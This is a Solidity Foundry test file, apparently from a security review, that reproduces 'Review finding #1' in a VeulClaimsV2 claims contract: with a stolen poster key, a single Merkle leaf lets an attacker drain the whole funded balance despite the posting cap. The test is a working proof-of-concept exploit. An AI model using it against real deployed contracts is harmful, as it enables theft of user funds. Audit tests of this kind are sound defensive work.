// SPDX-License-Identifier: Apache-2.0
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {IERC20, VeulClaimsV2} from "../../src/VeulClaimsV2.sol";

contract Usdg {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function transfer(address to, uint256 a) external returns (bool) { require(balanceOf[msg.sender] >= a); balanceOf[msg.sender] -= a; balanceOf[to] += a; return true; }
}

/// Review finding #1: the poster's cap limits the posted total, not what one leaf may hold.
contract PosterDrainTest is Test {
    function test_stolenPosterDrainsEverything() public {
        Usdg usdg = new Usdg();
        address owner = makeAddr("owner");
        address poster = makeAddr("poster");
        address alice = makeAddr("alice");
        VeulClaimsV2 claims = new VeulClaimsV2(IERC20(address(usdg)), address(0xbeef), owner);
        vm.startPrank(owner);
        claims.setPoster(poster);
        claims.setLimits(50e6, 20 hours); // the live limits
        vm.stopPrank();
        usdg.mint(address(claims), 1_000e6); // funded for many days

        // A legit root (posted by the owner): alice is owed 300.
        vm.prank(owner);
        claims.setRoot(keccak256(bytes.concat(keccak256(abi.encode(alice, uint256(300e6))))), 300e6);

        // Next day, with the stolen key: one leaf giving the thief the whole balance; the posted total only grows by 0.
        vm.warp(block.timestamp + 20 hours);
        address thief = makeAddr("thief");
        vm.prank(poster);
        claims.setRoot(keccak256(bytes.concat(keccak256(abi.encode(thief, uint256(1_000e6))))), 300e6);
        vm.prank(thief);
        claims.claim(1_000e6, new bytes32[](0));
        assertEq(usdg.balanceOf(thief), 1_000e6, "thief took everything");
        assertEq(usdg.balanceOf(address(claims)), 0);
    }
}
